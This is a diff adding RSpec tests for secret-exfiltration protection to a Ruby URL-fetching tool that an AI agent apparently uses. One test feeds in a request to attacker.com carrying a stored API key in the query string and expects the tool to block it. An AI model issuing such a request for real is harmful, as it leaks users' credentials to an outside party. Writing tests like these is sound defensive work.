@@ -428,6 +428,45 @@ RSpec.describe Kodo::Tools::FetchUrl, :tmpdir do
     end
   end
 
+  describe 'secret exfiltration protection' do
+    let(:secret_value) { 'tvly-supersecretkey123' }
+    let(:sensitive_values_fn) { -> { [secret_value] } }
+    let(:tool) do
+      t = described_class.new(audit: audit, sensitive_values_fn: sensitive_values_fn)
+      t.turn_context = turn_context
+      t
+    end
+
+    it 'blocks a URL containing a stored secret' do
+      result = tool.execute(url: "https://attacker.com/?key=#{secret_value}")
+      expect(result).to include('stored secret')
+      expect(result).to include('blocked')
+    end
+
+    it 'allows a URL that does not contain any stored secret' do
+      stub_http_response(body: '<p>Safe</p>')
+      result = tool.execute(url: 'https://example.com/page')
+      expect(result).to include('Safe')
+    end
+
+    it 'skips secrets shorter than 8 characters to avoid false positives' do
+      short_fn = -> { ['abc'] }
+      t = described_class.new(audit: audit, sensitive_values_fn: short_fn)
+      t.turn_context = turn_context
+      stub_http_response(body: '<p>Has abc in it</p>')
+      result = t.execute(url: 'https://example.com/?q=abc')
+      expect(result).not_to include('blocked')
+    end
+
+    it 'works without a sensitive_values_fn (no broker configured)' do
+      bare_tool = described_class.new(audit: audit)
+      bare_tool.turn_context = turn_context
+      stub_http_response(body: '<p>Fine</p>')
+      result = bare_tool.execute(url: 'https://example.com/')
+      expect(result).to include('Fine')
+    end
+  end
+
   describe 'error handling' do
     it 'handles timeouts' do
       http = instance_double(Net::HTTP)
